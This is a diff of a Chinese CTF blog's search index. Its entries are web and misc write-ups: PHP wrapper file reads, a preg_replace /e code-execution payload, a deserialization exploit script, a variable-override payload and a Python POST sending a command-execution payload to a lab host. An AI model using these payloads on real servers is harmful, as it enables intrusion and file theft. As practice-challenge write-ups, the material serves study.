@@ -1,45 +1,43 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2024安徽省分布式</title>
-    <url>/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/</url>
-    <content><![CDATA[<h1 id="2024安徽省分布式"><a href="#2024安徽省分布式" class="headerlink" title="2024安徽省分布式"></a>2024安徽省分布式</h1><h2 id="Misc-2-4"><a href="#Misc-2-4" class="headerlink" title="Misc (2&#x2F;4)"></a>Misc (2&#x2F;4)</h2><h3 id="Jack"><a href="#Jack" class="headerlink" title="Jack"></a>Jack</h3><p>拿到压缩包，先解压文件，是一个文件夹，里面有434个文件，看一眼文件</p>
-<p><img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/1.png" alt="图片1"></p>
-<span id="more"></span>
-<p>是个小作文，里面混杂着一串base64编码，考虑解密base64编码，其中一个文件就是flag，重命名所有文件，写一个python脚本，遍历文件，并提取base64编码解码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        encoded_data = f.read()</span><br><span class="line">        decoded_data = base64.b64decode(encoded_data)</span><br><span class="line">        <span class="keyword">return</span> decoded_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_files_in_folder</span>(<span class="params">folder_path</span>):</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(folder_path):</span><br><span class="line">        file_path = os.path.join(folder_path, filename)</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(file_path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                decoded_text = decode_base64(file_path)</span><br><span class="line">                <span class="built_in">print</span>(decoded_text)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error decoding <span class="subst">&#123;filename&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为你要遍历的文件夹路径</span></span><br><span class="line">folder_path = <span class="string">r&#x27;C:\Users\xtyy\Desktop\CTF\Jack\Jack&#x27;</span></span><br><span class="line">process_files_in_folder(folder_path)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    <title>[BJDCTF 2020]ZJCTF，不过如此</title>
+    <url>/2024/11/29/BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
+    <content><![CDATA[<h1 id="BJDCTF-2020-ZJCTF，不过如此"><a href="#BJDCTF-2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF 2020]ZJCTF，不过如此"></a>[BJDCTF 2020]ZJCTF，不过如此</h1><h2 id="php动态访问变量"><a href="#php动态访问变量" class="headerlink" title="php动态访问变量"></a>php动态访问变量</h2><p>题目链接：[<a href="https://www.nssctf.cn/problem/717">BJDCTF 2020]ZJCTF，不过如此 | NSSCTF</a></p>
+ <span id="more"></span>
 
-<p>第227个文件解码失败了，并且其他文件没有出flag，考虑比较特殊的编码，进去看看 <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/2.png" alt="图片2"></p>
-<p>​       随波逐流一键解码，拿到flag，可以算是非预期吧</p>
-<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/3.png" alt="3"></p>
-<h3 id="paint"><a href="#paint" class="headerlink" title="paint"></a>paint</h3><p>拿到图片，提示是画图，010扫一眼文件末尾，冗余较大，复制下来，粘贴到文本文件中，像是16进制编码，赛博大厨解密一下</p>
-<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/4.png" alt="4"></p>
-<p>自动识别 </p>
-<p>解出来像是(x,y)坐标</p>
-<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/5.png" alt="5"></p>
-<p>随波逐流文件操作，一把梭，生成二维码，扫码得到flag</p>
-<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/6.png" alt="6"></p>
-<h2 id="Crypto-3-4"><a href="#Crypto-3-4" class="headerlink" title="Crypto (3&#x2F;4)"></a>Crypto (3&#x2F;4)</h2><h3 id="enemy-command"><a href="#enemy-command" class="headerlink" title="enemy_command"></a>enemy_command</h3><p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/7.png" alt="7"></p>
-<p>看一眼三个值46 45 32猜测摩斯密码，写个简单的脚本46转0，45转1，32转空格</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">text=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">45 45 45 45 45 32 45 46 46 45 32 45 45 46 46 46 32 46 46 46 45 45 32 45 45 46 46 46 32 45 45 45 45 46 32 45 46 46 46 46 32 46 32 45 45 46 46 46 32 46 46 46 46 45 32 45 45 46 46 46 32 45 46 46 46 32 45 46 46 46 46 32 46 45 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 32 46 46 46 46 45 32 46 32 46 46 46 46 46 32 45 46 46 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 46 32 45 45 46 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 46 32 46 46 46 45 45 32 45 45 45 45 45 32 46 46 46 46 45 32 46 46 45 45 45 32 45 46 46 46 46 32 46 46 46 45 45 32 45 46 46 46 46 32 46 45 45 45 45 32 45 45 46 46 46 32 45 46 46</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> text:</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot; &quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot;6&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;0&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot;5&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot;3&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>拿到题目先看代码</p>
+<p><img src="/2024/11/29/BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/1.png" alt="img"></p>
+<p>file_get_contents函数是读取文件的，不过可以使用伪协议，那么我们给text变量传入data伪协议即可满足判断：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain,I have a dream</span><br></pre></td></tr></table></figure>
 
-<p>输出结果：</p>
-<p>11111 1001 11000 00011 11000 11110 10000 0 11000 00001 11000 1000 10000 01 00001 11100 00001 11100 00011 00011 10000 1000 00001 0 00000 10000 00001 100 00001 100 00000 11000 00011 00011 10000 10000 00011 11111 00001 00111 10000 00011 10000 01111 11000 100</p>
-<p>摩斯密码解密：</p>
-<p>0X73796E747B6A4848336B4E564D4D573366304263617D</p>
-<p>0x开头应该是16进制</p>
-<p>16进制解码：</p>
-<p>synt{jHH3kNVMMW3f0Bca}</p>
-<p>有flag雏形了，考虑是凯撒密码，随波逐流爆破：</p>
-<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/9.png" alt="9"></p>
-<p>拿到flag</p>
+<p>直接给file传入next.php读取失败</p>
+<p><img src="/2024/11/29/BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/2.png" alt="img"></p>
+<p>考虑用php伪协议读取</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>
+
+<p>Base64解密后得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里的 foreach($_GET as $re &#x3D;&gt; $str) 语句会把GET方法传入的键值对分别赋值给$re和$str</p>
+<p>之后调用 complex($re, $str) 函数</p>
+<p>complex($re, $str) 函数中正则表达式采用了&#x2F;e方法，PHP版本5.6.40，存在命令执行漏洞</p>
+<p>preg_replace的第二个参数会被当作命令执行，但是第二个参数是无法修改的，观察表达式，</p>
+<p>匹配$re变量加前后的单个字符，strtolower(“\1”)正好表达的就是匹配区的第一个值，如果第一个字符串刚好满足匹配，就会被选中，命令执行</p>
+<p>直接传入</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?\S=$&#123;phpinfo()&#125; </span><br></pre></td></tr></table></figure>
+
+<p>查找flag即可，这里的\S是匹配非空白字符，*是上述内容匹配多次，这样就会匹配传入的非空值，替换表达式的第二个值</p>
+<p><img src="/2024/11/29/BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/3.png" alt="img"></p>
+<p>这里的${}是动态访问变量，比如${getFlag()}就可以直接调用getFlag() 函数，然后再cmd传参也可以有类似效果，不过${}可以直接调用phpinfo()函数</p>
 ]]></content>
       <categories>
-        <category>安徽省赛writeup</category>
+        <category>日常writeup</category>
       </categories>
       <tags>
-        <tag>misc</tag>
-        <tag>crypto</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -80,73 +78,6 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28325/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `nl /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;@&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">with open(&quot;123.txt&quot;,&#x27;w&#x27;) as f:</span></span><br><span class="line"><span class="string">    f.write(payload)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;letter&#x27;</span>: payload&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 POST 请求</span></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出响应内容</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2024/11/22/NISACTF-2022-middlerce/5.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>日常writeup</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[GDOUCTF 2023]反方向的钟</title>
-    <url>/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/</url>
-    <content><![CDATA[<h1 id="GDOUCTF-2023-反方向的钟"><a href="#GDOUCTF-2023-反方向的钟" class="headerlink" title="[GDOUCTF 2023]反方向的钟"></a>[GDOUCTF 2023]反方向的钟</h1><h2 id="反序列化-原生类的利用"><a href="#反序列化-原生类的利用" class="headerlink" title="反序列化 + 原生类的利用"></a>反序列化 + 原生类的利用</h2><p>题目链接<a href="https://www.nssctf.cn/problem/3723">https://www.nssctf.cn/problem/3723</a></p>
-<span id="more"></span>
-<p>拿到题目，先代码审计</p>
-<p><img src="/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/1.png" alt="图片1">​</p>
-<p>看了一下是反序列化攻击</p>
-<p>直接分析代码，满足</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>语句</p>
-<p>执行原生类，然后利用wakeup触发函数，到这里执行，直接贴exp</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>=<span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">teacher</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>-&gt;name=<span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>-&gt;rank=<span class="string">&#x27;department&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">classroom</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>-&gt;leader = <span class="variable">$p1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p3</span>= <span class="keyword">new</span> <span class="title function_ invoke__">school</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p3</span>-&gt;department = <span class="variable">$p2</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$p3</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>然后传入原生类</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">SplFileObject</span>&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
-
-<p>这里已经给出flag位置，SplFileObject只能读取单行，所以用伪协议读取全文，解密拿到flag</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHANCiRmbGFnID0gIk5TU0NURnszMjVjODZhNS01M2VjLTRkMzctYTU4OC02MWRiOTVjYzg1NGR9IjsNCj8+DQo=</span><br></pre></td></tr></table></figure>
-
-<p>$flag &#x3D; “NSSCTF{325c86a5-53ec-4d37-a588-61db95cc854d}”;</p>
-]]></content>
-      <categories>
-        <category>日常writeup</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php变量间接引用</title>
-    <url>/2024/11/11/php%E5%8F%98%E9%87%8F%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="MoeCTF-2022-ezphp"><a href="#MoeCTF-2022-ezphp" class="headerlink" title="[MoeCTF 2022]ezphp"></a>[MoeCTF 2022]ezphp</h1><p>记一次php变量间接引用</p>
-<p>题目来源：[<a href="https://www.nssctf.cn/problem/3348">MoeCTF 2022]ezphp | NSSCTF</a></p>
-<span id="more"></span>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$giveme</span> = <span class="string">&#x27;can can need flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$getout</span> = <span class="string">&#x27;No! flag.Try again. Come on!&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$giveme</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>代码审计一下，必须以GET或POST传入一个flag参数，才能绕过第一个exit，如果flag参数的值也同为flag，那会被第二个exit终止，如果flag参数不为flag的话，后面flag的值就会被新的值覆盖掉</p>
-<p>分析一下两个foreach循环：形如传参name&#x3D;xtyy，那么就会使$key&#x3D;name $value&#x3D;xtyy</p>
-<p>重点在于第二个foreach循环</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里是变量的间接引用，相当于把$key替换成上面的name，也就会变成$name</p>
-<p>也就是说，传入的?name&#x3D;xtyy就会变成$name&#x3D;$xtyy的传参，</p>
-<p>如果这里传入a&#x3D;flag，就会把$flag的值储存在变量$a中，后面再让$flag&#x3D;$a，就可以把flag原本的值拿回来</p>
-<p>payload：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?a=flag&amp;flag=a</span><br></pre></td></tr></table></figure>
-
-<p>其实这相当于</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>当然如果传参：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?a=flag&amp;b=a&amp;flag=b</span><br></pre></td></tr></table></figure>
-
-<p>只要能在最后把变量flag的值赋回来，都是可以的</p>
-<p>成功的拿到了flag</p>
-<p><img src="/2024/11/11/php%E5%8F%98%E9%87%8F%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8/1.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>日常writeup</category>
@@ -199,6 +130,42 @@
 
 <p>拿到flag</p>
 <p><img src="/2024/11/15/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval/4.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>日常writeup</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php变量间接引用</title>
+    <url>/2024/11/11/php%E5%8F%98%E9%87%8F%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="MoeCTF-2022-ezphp"><a href="#MoeCTF-2022-ezphp" class="headerlink" title="[MoeCTF 2022]ezphp"></a>[MoeCTF 2022]ezphp</h1><h2 id="记一次php变量间接引用"><a href="#记一次php变量间接引用" class="headerlink" title="记一次php变量间接引用"></a>记一次php变量间接引用</h2><p>题目来源：[<a href="https://www.nssctf.cn/problem/3348">MoeCTF 2022]ezphp | NSSCTF</a></p>
+<span id="more"></span>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$giveme</span> = <span class="string">&#x27;can can need flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$getout</span> = <span class="string">&#x27;No! flag.Try again. Come on!&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$giveme</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码审计一下，必须以GET或POST传入一个flag参数，才能绕过第一个exit，如果flag参数的值也同为flag，那会被第二个exit终止，如果flag参数不为flag的话，后面flag的值就会被新的值覆盖掉</p>
+<p>分析一下两个foreach循环：形如传参name&#x3D;xtyy，那么就会使$key&#x3D;name $value&#x3D;xtyy</p>
+<p>重点在于第二个foreach循环</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里是变量的间接引用，相当于把$key替换成上面的name，也就会变成$name</p>
+<p>也就是说，传入的?name&#x3D;xtyy就会变成$name&#x3D;$xtyy的传参，</p>
+<p>如果这里传入a&#x3D;flag，就会把$flag的值储存在变量$a中，后面再让$flag&#x3D;$a，就可以把flag原本的值拿回来</p>
+<p>payload：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?a=flag&amp;flag=a</span><br></pre></td></tr></table></figure>
+
+<p>其实这相当于</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当然如果传参：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?a=flag&amp;b=a&amp;flag=b</span><br></pre></td></tr></table></figure>
+
+<p>只要能在最后把变量flag的值赋回来，都是可以的</p>
+<p>成功的拿到了flag</p>
+<p><img src="/2024/11/11/php%E5%8F%98%E9%87%8F%E9%97%B4%E6%8E%A5%E5%BC%95%E7%94%A8/1.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>日常writeup</category>
@@ -338,6 +305,78 @@
       <tags>
         <tag>misc</tag>
         <tag>crypto</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024安徽省分布式</title>
+    <url>/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/</url>
+    <content><![CDATA[<h1 id="2024安徽省分布式"><a href="#2024安徽省分布式" class="headerlink" title="2024安徽省分布式"></a>2024安徽省分布式</h1><h2 id="Misc-2-4"><a href="#Misc-2-4" class="headerlink" title="Misc (2&#x2F;4)"></a>Misc (2&#x2F;4)</h2><h3 id="Jack"><a href="#Jack" class="headerlink" title="Jack"></a>Jack</h3><p>拿到压缩包，先解压文件，是一个文件夹，里面有434个文件，看一眼文件</p>
+<p><img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/1.png" alt="图片1"></p>
+<span id="more"></span>
